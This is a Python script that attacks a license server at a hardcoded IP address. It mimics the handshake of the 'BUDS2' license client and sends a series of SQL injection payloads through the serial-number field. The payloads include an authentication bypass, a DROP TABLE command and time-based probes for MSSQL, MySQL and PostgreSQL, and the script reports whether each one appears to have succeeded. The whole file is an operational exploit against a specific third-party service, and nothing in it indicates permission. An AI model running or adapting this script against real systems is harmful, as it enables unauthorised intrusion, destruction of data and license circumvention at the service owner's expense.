import socket
import struct
import time

TARGET_HOST = '194.135.20.80'
TARGET_PORT = 9005

# Common SQL Injection payloads to trigger errors
PAYLOADS = [
    "'", 
    "''", 
    "\""
    ";", 
    "' OR '1'='1", 
    "admin' --", 
    "100123456'", 
    "100123456; DROP TABLE Licenses", 
    "100123456' WAITFOR DELAY '0:0:5'--", # MSSQL specific
    "100123456' AND SLEEP(5)--",           # MySQL specific
    "100123456' || pg_sleep(5)--"          # PostgreSQL specific
]

def write_dotnet_string(sock, text):
    try:
        encoded = text.encode('utf-8')
        length = len(encoded)
        while length >= 0x80:
            sock.send(bytes([(length | 0x80) & 0xFF]))
            length >>= 7
        sock.send(bytes([length]))
        sock.send(encoded)
        return True
    except:
        return False

def test_payload(payload):
    print(f"\n[Testing Payload]: {payload}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10.0) # Increased timeout for time-based attacks
    
    start_time = time.time()
    try:
        sock.connect((TARGET_HOST, TARGET_PORT))
        
        # Handshake
        write_dotnet_string(sock, "BUDS2 License Client for DIUS platform")
        ver = sock.recv(1)
        if ver != b'\x00':
            print("  [-] Handshake failed")
            return

        # Injecting payload into the SERIAL field
        # Format: ComputerID,Serial,Email,...
        # We start with a fake valid ComputerID to get past initial checks if any
        fake_id = "TEST_COMPUTER_ID_12345"
        user_data = f"{fake_id},{payload},payload@test.com,Tester,Test,TestCorp,123,en"
        
        # print(f"  [>] Sending: {user_data}")
        write_dotnet_string(sock, user_data)
        
        # Read response
        resp = sock.recv(1024)
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"  [<] Duration: {duration:.2f}s")
        if resp:
            print(f"  [<] Response Header (Hex): {resp[:5].hex()}")
            try:
                # Try to decode typical .NET string response
                # If first byte is status 0x00 or 0x82, checking what follows
                if len(resp) > 1:
                     print(f"  [<] Raw Content: {resp}")
            except:
                pass
                
            if resp[0] == 0x82:
                print("  [Result] Rejected (Standard 'Not Found')")
            elif resp[0] == 0x00:
                print("  [Result] Success?!? (Did we bypass auth?)")
            else:
                print(f"  [Result] UNKNOWN RESPONSE: {resp.hex()}")
                # If we get a verbose error string here, it reveals the DB
        else:
            print("  [Result] Connection closed with no response")

        # Specific check for time-based injection success
        if duration > 4.5 and ("WAITFOR" in payload or "SLEEP" in payload):
            print("  [!!!] POSSIBLE TIME-BASED INJECTION SUCCESS [!!!]")

    except socket.timeout:
        print("  [Result] Timeout (Could be time-based injection or dropped packet)")
    except Exception as e:
        print(f"  [-] Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    print(f"Probing Database Type for {TARGET_HOST}...")
    for p in PAYLOADS:
        test_payload(p)
        time.sleep(0.5)
